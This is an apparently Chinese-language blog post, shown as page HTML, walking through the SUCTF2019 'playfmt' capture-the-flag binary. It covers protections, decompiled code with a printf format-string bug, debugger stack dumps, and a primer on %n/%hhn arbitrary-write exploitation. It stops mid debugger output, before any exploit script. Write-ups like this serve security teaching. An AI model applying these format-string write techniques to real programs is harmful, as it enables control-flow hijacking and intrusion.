@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="首先检查一下程序 1234567syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt[*] &apos;/mnt/hgfs/share/tmp/playfmt/playfmt&apos;    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2019-playfmt-printf的成链攻击">
+<meta property="og:url" content="http://yoursite.com/2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="首先检查一下程序 1234567syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt[*] &apos;/mnt/hgfs/share/tmp/playfmt/playfmt&apos;    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01027399ee82efa5dd.png">
+<meta property="og:updated_time" content="2019-11-13T09:07:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SUCTF2019-playfmt-printf的成链攻击">
+<meta name="twitter:description" content="首先检查一下程序 1234567syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt[*] &apos;/mnt/hgfs/share/tmp/playfmt/playfmt&apos;    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX">
+<meta name="twitter:image" content="https://p1.ssl.qhimg.com/t01027399ee82efa5dd.png">
+  <link rel="canonical" href="http://yoursite.com/2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>SUCTF2019-playfmt-printf的成链攻击 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">SUCTF2019-playfmt-printf的成链攻击
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-11-12 09:06:36" itemprop="dateCreated datePublished" datetime="2019-11-12T09:06:36-08:00">2019-11-12</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-11-13 01:07:08" itemprop="dateModified" datetime="2019-11-13T01:07:08-08:00">2019-11-13</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先检查一下程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt</span><br><span class="line">[*] '/mnt/hgfs/share/tmp/playfmt/playfmt'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabledx</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以知道我们无法修改got表，栈上的代码不可执行，尝试执行一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt</span><br><span class="line">open flag error , please contact the administrator!</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt</span><br><span class="line">Testing my C++ skills...</span><br><span class="line">testing <span class="number">1.</span>..</span><br><span class="line">hello,world</span><br><span class="line">testing <span class="number">2.</span>..</span><br><span class="line">hello,world</span><br><span class="line">testing <span class="number">3.</span>..</span><br><span class="line">You think I will leave the flag?</span><br><span class="line">hello,world</span><br><span class="line">=====================</span><br><span class="line">  Magic echo Server</span><br><span class="line">=====================</span><br></pre></td></tr></table></figure>
+
+<p>用IDA Pro查看一下源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  derived *v3; <span class="comment">// ebx</span></span><br><span class="line">  derived *v4; <span class="comment">// ebx</span></span><br><span class="line">  derived *v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [esp+0h] [ebp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  v8 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"open flag error , please contact the administrator!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fscanf</span>(stream, <span class="string">"%s"</span>, v8);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Testing my C++ skills..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 1..."</span>);</span><br><span class="line">  v3 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v3);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v3)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 2..."</span>);</span><br><span class="line">  v4 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v4);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v4)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 3..."</span>);</span><br><span class="line">  v5 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v5, v8);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You think I will leave the flag?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    base::~base(v5);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v5)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = Get_return_addr();</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">if</span> ( Get_return_addr() != v6 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到关键功能函数<strong>logo</strong></p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">logo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v0 = Get_return_addr();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  Magic echo Server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">  do_fmt();</span><br><span class="line">  result = Get_return_addr() != v0;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到漏洞点<strong>do_fmt</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 程序漏洞点比较明显，直接写了一个循环的<code>printf</code>格式化漏洞，而输入的数据是存储在<code>buf</code>指针上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ readelf -S playfmt</span><br><span class="line">There are 30 section headers, starting at offset 0x2c44:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 0000b4 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          08048260 000260 000190 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080483f0 0003f0 000159 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804854a 00054a 000032 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804857c 00057c 000060 00   A  6   2  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080485dc 0005dc 000098 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048674 000674 000008 08  AI  5  23  4</span><br><span class="line">  [11] .init             PROGBITS        0804867c 00067c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080486a0 0006a0 000020 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080486c0 0006c0 000090 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048750 000750 000532 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048c84 000c84 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048c98 000c98 0000e9 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048d84 000d84 00007c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048e00 000e00 000218 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      0804ae98 001e98 000008 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      0804aea0 001ea0 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        0804aea4 001ea4 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         0804aea8 001ea8 000100 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        0804afa8 001fa8 000058 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804b000 002000 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804b020 002008 0000ec 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 002008 000035 01  MS  0   0  1</span><br><span class="line">  [27] .shstrtab         STRTAB          00000000 002b40 000101 00      0   0  1</span><br><span class="line">  [28] .symtab           SYMTAB          00000000 002040 000660 10     29  49  4</span><br><span class="line">  [29] .strtab           STRTAB          00000000 0026a0 0004a0 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>
+
+<p><code>buf</code>则是位于<strong>bss</strong>段中地址为<strong>0x0804B040</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804B</span>040                 <span class="keyword">public</span> buf</span><br><span class="line">.bss:<span class="number">0804B</span>040 ; <span class="keyword">char</span> buf[<span class="number">200</span>]</span><br><span class="line">.bss:<span class="number">0804B</span>040 buf             db <span class="number">0</span><span class="function">C8h <span class="title">dup</span><span class="params">(?)</span>    </span>; DATA XREF: do_fmt(<span class="keyword">void</span>)+E↑o</span><br></pre></td></tr></table></figure>
+
+<p> 所以思路就是直接修改栈上的返回地址，<code>return</code>的时候劫持流程</p>
+<p>我们首先复习一下格式化字符</p>
+<p>格式化字符串漏洞的具体原理就不再详细叙述，这里主要简单介绍一下格式化参数位置的计算和漏洞利用时常用的格式字符。</p>
+<ul>
+<li>参数位置计算</li>
+</ul>
+<p>linux下32位程序是栈传参，从左到右参数顺序为<code>$esp+4,$esp+8,...</code>；因此<code>$esp+x</code>的位置应该是格式化第<code>x/4</code>个参数。</p>
+<p>linux下64位程序是寄存器加栈传参，从左到右参数顺序为<code>$rdi,$rsi,$rdx,$rcx,$r8,$r9,$rsp+8,...</code>；因此<code>$rsp+x</code>的位置应该是格式化第<code>x/8+6</code>个参数。</p>
+<ul>
+<li>常用的格式化字符</li>
+</ul>
+<p>用于地址泄露的格式化字符有：<code>%x、%s、%p</code>等；</p>
+<p>用于地址写的格式化字符：<code>%hhn</code>（写入一字节），<code>%hn</code>（写入两字节），<code>%n</code>（32位写四字节，64位写8字节）；</p>
+<p><code>%&lt; number&gt;$type</code>：直接作用第number个位置的参数，如：<code>%7$x</code>读第7个位置参数值，<code>%7$n</code>对第7个参数位置进行写。</p>
+<p><code>%c</code>：输出<strong>number</strong>个字符，配合<code>%n</code>进行任意地址写，例如<code>&quot;%{}c%{}$hhn&quot;.format(address,offset)</code>就是向<code>offset0</code>参数指向的地址最低位写成<code>address</code></p>
+<p>一般来说，栈上的格式化字符串漏洞利用步骤是先泄露地址，包括<strong>ELF</strong>程序地址和<strong>libc</strong>地址；然后将需要改写的<strong>GOT</strong>表地址直接传到栈上，同时利用<code>%c%n</code>的方法改写入<code>system或one_gadget</code>地址，最后就是劫持流程。但是对于<strong>BSS</strong>段或是堆上格式化字符串，无法直接将想要改写的地址指针放置在栈上，也就没办法实现任意地址写。 </p>
+<p>那我们就先下一个断点在printf执行之前，看看栈上有什么可以利用的东西</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffd030</span> —▸ <span class="number">0x804b040</span> (buf) ◂— <span class="number">0xa</span> <span class="comment">/* '\n' */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffd034</span> —▸ <span class="number">0x8048cac</span> ◂— jno    <span class="number">0x8048d23</span> <span class="comment">/* 'quit' */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│      <span class="number">0xffffd038</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffd03c</span> —▸ <span class="number">0x80488e8</span> (logo()+<span class="number">59</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffd040</span> —▸ <span class="number">0x8048cb1</span> ◂— cmp    eax, <span class="number">0x3d3d3d3d</span> <span class="comment">/* '=====================' */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│      <span class="number">0xffffd044</span> —▸ <span class="number">0x8048ac4</span> (main+<span class="number">440</span>) —▸ <span class="number">0xfffd82e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│ ebp  <span class="number">0xffffd048</span> —▸ <span class="number">0xffffd068</span> —▸ <span class="number">0xffffd098</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│      <span class="number">0xffffd04c</span> —▸ <span class="number">0x80488f0</span> (logo()+<span class="number">67</span>) —▸ <span class="number">0xffff56e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│      <span class="number">0xffffd050</span> —▸ <span class="number">0xf7e30000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1d7d6c</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> <span class="number">0x8048000</span>  <span class="number">0x804a000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804a000</span>  <span class="number">0x804b000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804b000</span>  <span class="number">0x804c000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804c000</span>  <span class="number">0x806e000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>      [heap]</span><br><span class="line"><span class="number">0xf7b36000</span> <span class="number">0xf7b38000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7b38000</span> <span class="number">0xf7b54000</span> r-xp    <span class="number">1</span>c000 <span class="number">0</span>      /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b54000</span> <span class="number">0xf7b55000</span> r--p     <span class="number">1000</span> <span class="number">1b</span>000  /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b55000</span> <span class="number">0xf7b56000</span> rw-p     <span class="number">1000</span> <span class="number">1</span>c000  /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b56000</span> 